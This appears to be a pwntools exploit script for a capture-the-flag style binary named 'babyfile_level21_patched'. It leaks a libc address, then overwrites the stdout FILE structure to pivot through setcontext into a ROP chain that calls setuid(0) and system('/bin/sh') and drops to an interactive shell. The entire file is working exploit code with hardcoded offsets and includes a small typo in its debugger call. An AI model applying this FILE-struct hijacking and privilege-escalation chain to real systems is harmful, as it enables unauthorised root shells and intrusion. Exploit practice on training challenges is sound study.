from pwn import *

binary = './babyfile_level21_patched'

p = process(binary)

s = '''
b * main+199
b * main+90
b * main+129
b * main+166
b* setcontext+61
b * setcontext+334
'''

p.recvuntil("puts() within libc is: ")

puts_addr = int(p.recvline().strip(), 16)

print("puts_addr @ ", hex(puts_addr))


libc_base = puts_addr - 0x84420

stderr = libc_base + 0x4040


setcontext = puts_addr - 0x2f500 + 45
_IO_stdfile_1_lock = puts_addr + 0x16a3c0
_IO_2_1_stdout_ = puts_addr + 0x169280

writable_space = _IO_2_1_stdout_ - 0xe0

print("stderr @ ", hex(stderr))



# gadgets
setuid = libc_base + 0xe4150
pop_rdi = libc_base + 0x0000000000023b6a
binsh_addr = libc_base + 0x1b45bd
system_addr = libc_base + 0x52290


# ROP chain
payload = p64(0) # rdi was before this
payload += p64(setuid)
payload += p64(pop_rdi)
payload += p64(binsh_addr)
payload += p64(system_addr)

# padding up to _IO_2_1_stdout_ file struct
payload += b'\x00' * (0xe0 - len(payload))



# corrupting _IO_2_1_stdout_ file struct
payload += b'\x00' * 0x78 # 0
payload += p64(setcontext) # 0x78
payload += p64(0) # 0x80
payload += p64(_IO_stdfile_1_lock + 0xe0)  # 88
payload += b'\x00' * 0x10  
payload += p64(_IO_2_1_stdout_ + 0x10)  # _wide_data

#payload += b'\x00' * (0xe0 - 0xa8 - 8)  # Rest of struct

# setting up rsp

payload += b'\x00' * 0x8
payload += p64(writable_space)# rsp would be set to this
payload += p64(pop_rdi) # rcx would be set to this
payload += b'\x00' * 0x8 
payload += b'\x00' * 0x8
payload += b'\x00' * 0x8


payload += p64(puts_addr + 0x1649d8 - 0x38)
payload += b'\x41' * 0x10
payload += p64(_IO_2_1_stdout_+0x10)

#payload = b'A'
gdb,attach(p, s)
time.sleep(2)

p.sendline(payload)

p.interactive()
